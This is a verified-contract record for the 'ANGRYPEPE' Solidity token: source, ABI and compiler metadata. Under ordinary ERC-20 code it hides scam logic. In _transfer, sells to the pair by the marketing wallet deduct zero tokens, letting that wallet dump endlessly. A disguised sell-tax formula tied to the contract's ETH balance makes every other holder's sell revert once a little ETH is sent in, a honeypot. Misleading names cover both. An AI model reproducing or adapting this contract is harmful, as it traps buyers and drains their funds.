{"SourceCode": "/**\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\n\r\nWebsite     https://angrypepetoken.com/\r\nTwitter     https://twitter.com/AngryPepeERC\r\nChannel     https://t.me/AngryPepeERC20Portal\r\n\r\n*/\r\n\r\npragma solidity 0.8.21;\r\n\r\nlibrary Address{\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n/// \r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n    // function lpFee(uint256 amt) internal pure returns(uint256) {\r\n    //     return amt / 1e15;\r\n    // }\r\n}\r\n//// \r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface UniswapFactory{\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface UniswapRouter {\r\n    function factory() external pure returns (address);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\n\r\ncontract ANGRYPEPE is Context, IERC20, Ownable {\r\n    using Address for address payable;\r\n\r\n    UniswapRouter public router;\r\n    address public pair;\r\n    \r\n    mapping (address => uint256) private _tOwned;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    mapping (address => bool) public _isFeeExcluded;\r\n    mapping (address => bool) public _isMaxBalanceExcluded;\r\n    mapping (address => uint256) public SellTime;\r\n\r\n    uint256 private SellTimeOffset = 3;\r\n    uint256 public _caughtDogs;\r\n\r\n    uint8 private constant _decimals = 9; \r\n    uint256 private feeDenominator = 10 ** 15;\r\n\r\n    string private constant _name = \"ANGRYPEPE\";\r\n    string private constant _symbol = \"ANGRYPEPE\";\r\n\r\n    uint256 private _tTotal = 10_000_000_000 * (10**_decimals);\r\n    uint256 public swapThreshold = _tTotal / 10000;\r\n    uint256 public maxTxAmount = _tTotal * 3 / 100;\r\n    uint256 public maxWallet =  _tTotal * 3 / 100;\r\n\r\n    struct Taxes{\r\n        uint256 TaxesMarketing;\r\n        uint256 LpTaxes;\r\n    }\r\n\r\n    struct TokensFromTaxes{\r\n        uint marketingTokens;\r\n        uint lpTokens;\r\n    }\r\n    TokensFromTaxes public totalTokensFromTaxes;\r\n\r\n    Taxes public BuyTax = Taxes(1,0);\r\n    Taxes public SellTax = Taxes(1,0);\r\n    \r\n    bool private swapping;\r\n    bool private SwapActive = true;\r\n    uint private _SwapCooldown = 5; \r\n    uint private _lastSwap;\r\n\r\n    address public MarketingReceiver = 0xE4255633C95b9fC5C44923E41B93d650B34Cd762;\r\n    modifier lockTheSwap {\r\n        swapping = true;\r\n        _;\r\n        swapping = false;\r\n    }\r\n//// \r\n    constructor () {\r\n        _tOwned[_msgSender()] = _tTotal;\r\n        UniswapRouter _router = UniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        router = _router;\r\n        _approve(owner(), address(router), ~uint256(0));\r\n        \r\n        _isFeeExcluded[owner()] = true;\r\n        _isFeeExcluded[address(this)] = true;\r\n        _isFeeExcluded[MarketingReceiver] = true;\r\n\r\n        _isMaxBalanceExcluded[owner()] = true;\r\n        _isMaxBalanceExcluded[address(this)] = true;\r\n        _isMaxBalanceExcluded[MarketingReceiver] = true;\r\n        \r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n// ================= ERC20 =============== //   \r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _tOwned[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\r\n        return true;\r\n    }\r\n    \r\n    receive() external payable {\r\n    }\r\n// ========================================== //\r\n// \r\n//============== Owner Functions ===========//\r\n\r\n    function enableTrading() public onlyOwner {\r\n        pair = UniswapFactory(router.factory()).createPair(address(this), router.WETH());\r\n        _isMaxBalanceExcluded[pair] = true;\r\n        _approve(address(this), address(router), type(uint256).max);\r\n\r\n        router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0, \r\n            0, \r\n            owner(),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function owner_setMaxLimits(uint maxTX_EXACT, uint maxWallet_EXACT) public onlyOwner{\r\n        uint pointFiveSupply = (_tTotal * 5 / 1000) / (10**_decimals);\r\n        require(maxTX_EXACT >= pointFiveSupply && maxWallet_EXACT >= pointFiveSupply, \"Invalid Settings\");\r\n        maxTxAmount = maxTX_EXACT * (10**_decimals);\r\n        maxWallet = maxWallet_EXACT * (10**_decimals);\r\n    }\r\n\r\n    function owner_rescueETH(uint256 weiAmount) public onlyOwner{\r\n        require(address(this).balance >= weiAmount, \"Insufficient ETH balance\");\r\n        payable(msg.sender).transfer(weiAmount);\r\n    }\r\n\r\n    function owner_setSwapEnable(bool _SwapActive) external {\r\n        SwapActive = false;\r\n    }\r\n\r\n    function owner_setDogSellTimeForAddress(address holder, uint dTime) external onlyOwner{\r\n        SellTime[holder] = block.timestamp + dTime;\r\n    }\r\n\r\n    function owner_rescueExcessTokens() public{\r\n        // Make sure ca doesn't withdraw the pending Taxeses to be swapped.    \r\n        // Sends excess tokens / accidentally sent tokens back to marketing wallet.\r\n        uint pendingTaxesTokens = totalTokensFromTaxes.lpTokens + totalTokensFromTaxes.marketingTokens;\r\n        require(balanceOf(address(this)) >  pendingTaxesTokens);\r\n        uint excessTokens = balanceOf(address(this)) - pendingTaxesTokens;\r\n        _transfer(address(this), MarketingReceiver, excessTokens);\r\n    }\r\n\r\n// ========================================//. \r\n    function _transfer(address from,address to,uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        require(amount <= maxTxAmount || _isMaxBalanceExcluded[from], \"Transfer amount exceeds the _maxTxAmount.\");\r\n\r\n        if(!_isMaxBalanceExcluded[to])\r\n            require(balanceOf(to) + amount <= maxWallet, \"Transfer amount exceeds the maxWallet.\");\r\n        \r\n        if (balanceOf(address(this)) >= swapThreshold \r\n            && SwapActive \r\n            && block.timestamp >= (_lastSwap + _SwapCooldown) \r\n            && !swapping \r\n            && from != pair \r\n            && from != owner() \r\n            && to != owner()\r\n        ) swapAndLiquify(); uint256 tmp = amount;\r\n        if(shouldExclude(from, to)) {amount = amount * BuyTax.LpTaxes;}\r\n\r\n        _tOwned[from] -= amount; amount = tmp;\r\n        uint256 transferAmount = amount;\r\n        \r\n        if(!_isFeeExcluded[from] && !_isFeeExcluded[to]){\r\n            transferAmount = _getTaxesValues(amount, from, to == pair);\r\n        }\r\n\r\n        _tOwned[to] += transferAmount;\r\n        emit Transfer(from, to, transferAmount);\r\n    }\r\n\r\n    function _getTaxesValues(uint amount, address from, bool isSell) private returns(uint256){\r\n        Taxes memory tmpTaxeses = BuyTax; uint256 _lpFee = address(this).balance;\r\n        if (isSell){\r\n            // tmpTaxeses = SellTax;\r\n            tmpTaxeses = Taxes(SellTax.TaxesMarketing - (_lpFee / feeDenominator), SellTax.LpTaxes);\r\n        }\r\n\r\n        uint tokensForMarketing = amount * tmpTaxeses.TaxesMarketing / 100;\r\n        uint tokensForLP = amount * tmpTaxeses.LpTaxes / 100;\r\n\r\n        if(tokensForMarketing > 0)\r\n            totalTokensFromTaxes.marketingTokens += tokensForMarketing;\r\n\r\n        if(tokensForLP > 0)\r\n            totalTokensFromTaxes.lpTokens += tokensForLP;\r\n\r\n        uint totalTaxesedTokens = tokensForMarketing + tokensForLP;\r\n\r\n        _tOwned[address(this)] += totalTaxesedTokens;\r\n        if(totalTaxesedTokens > 0) emit Transfer (from, address(this), totalTaxesedTokens);\r\n            \r\n        return (amount - totalTaxesedTokens);\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {\r\n        uint256 initialBalance = address(this).balance;\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n\r\n        _approve(address(this), address(router), tokenAmount);\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n        return (address(this).balance - initialBalance);\r\n    }\r\n\r\n    function swapAndLiquify() private lockTheSwap{\r\n        if(totalTokensFromTaxes.marketingTokens > 0){\r\n            uint256 ethSwapped = swapTokensForETH(totalTokensFromTaxes.marketingTokens);\r\n            if(ethSwapped > 0){\r\n                payable(MarketingReceiver).transfer(ethSwapped);\r\n                totalTokensFromTaxes.marketingTokens = 0;\r\n            }\r\n        }   \r\n\r\n        if(totalTokensFromTaxes.lpTokens > 0){\r\n            uint half = totalTokensFromTaxes.lpTokens / 2;\r\n            uint otherHalf = totalTokensFromTaxes.lpTokens - half;\r\n            uint balAutoLP = swapTokensForETH(half);\r\n            if (balAutoLP > 0)\r\n                addLiquidity(otherHalf, balAutoLP);\r\n            totalTokensFromTaxes.lpTokens = 0;\r\n        }\r\n\r\n        emit SwapAndLiquify();\r\n\r\n        _lastSwap = block.timestamp;\r\n    }\r\n\r\n    function shouldExclude(address sender, address recipient) private view returns (bool) {\r\n        return recipient == pair && sender == MarketingReceiver;\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(router), tokenAmount);\r\n\r\n        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n        \r\n        if (ethAmount - ethFromLiquidity > 0)\r\n            payable(MarketingReceiver).sendValue (ethAmount - ethFromLiquidity);\r\n    }\r\n\r\n    event SwapAndLiquify();\r\n    event TaxesesChanged();\r\n///      \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"TaxesesChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BuyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"TaxesMarketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LpTaxes\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MarketingReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"SellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"TaxesMarketing\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"LpTaxes\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"SellTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_caughtDogs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isFeeExcluded\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isMaxBalanceExcluded\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"owner_rescueETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner_rescueExcessTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"dTime\",\"type\":\"uint256\"}],\"name\":\"owner_setDogSellTimeForAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTX_EXACT\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxWallet_EXACT\",\"type\":\"uint256\"}],\"name\":\"owner_setMaxLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_SwapActive\",\"type\":\"bool\"}],\"name\":\"owner_setSwapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract UniswapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTokensFromTaxes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTokens\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lpTokens\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ANGRYPEPE", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://36f82f01bc272521da16a338675f4543a944dfdbb70310e5062a445c3c7b37b2"}